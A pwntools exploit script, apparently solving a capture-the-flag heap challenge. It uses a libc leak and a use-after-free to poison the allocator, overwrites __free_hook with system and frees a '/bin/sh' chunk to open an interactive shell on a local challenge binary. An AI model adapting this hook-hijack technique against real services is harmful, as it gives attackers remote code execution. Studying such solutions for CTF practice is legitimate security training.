from pwn import *
context(
    terminal = ['tmux','splitw','-h'],
    os = "linux",
    arch = "amd64",
    log_level="debug",
)
def debug(io):
    gdb.attach(io,
'''
b *Add
b *Delete
b *Edit
b *Gift
'''
)
def getio():
    if sys.argv[1] == 'local':
        return process("./pwn")
    elif sys.argv[1] == 'remote':
        return remote("127.0.0.1", 9999)
io = getio()
# debug(io)

def Add(index):
    io.sendafter(b"choice", "\x01")
    io.sendafter(b"index?", p16(index))
def Delete(index):
    io.sendafter(b"choice", "\x02")
    io.sendafter(b"index?", p16(index))
def Edit(index, content):
    io.sendafter(b"choice", "\x03")
    io.sendafter(b"index?", p16(index))
    io.sendafter(b"content", content)
def Gift():
    io.sendafter(b"choice", "\x04")

Gift()

io.recvuntil("here is one gift for you:")
libc = int(io.recv(0xe), 16) - 0x64e40
print(hex(libc))

__free_hook = 0x3ed8e8 + libc
system = 0x4f420 + libc

Add(0)
Delete(0)
Edit(0, p64(__free_hook))
Add(1)
Add(2)
Edit(1, b'/bin/sh')
Edit(2, p64(system))
Delete(1)

io.interactive()
